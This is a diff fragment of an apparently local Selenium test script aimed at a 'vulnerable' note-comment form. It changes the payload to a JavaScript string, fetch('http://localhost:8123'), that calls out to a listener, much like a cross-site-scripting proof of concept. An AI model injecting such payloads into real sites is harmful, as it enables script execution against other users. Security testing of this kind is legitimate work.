@@ -9,7 +9,7 @@ vulnerable_url = 'https://localhost:8085/'
 form_class = 'new-note common-note-form gfm-form js-main-target-form'
 #input_field_id = './..'
 #submit_button_id = './..'
-payload_exe = 'js-request:localhost:8123'
+js_payload_exe = "fetch('http://localhost:8123')"
 
 driver = webdriver.Safari()
 driver.get(vulnerable_url)
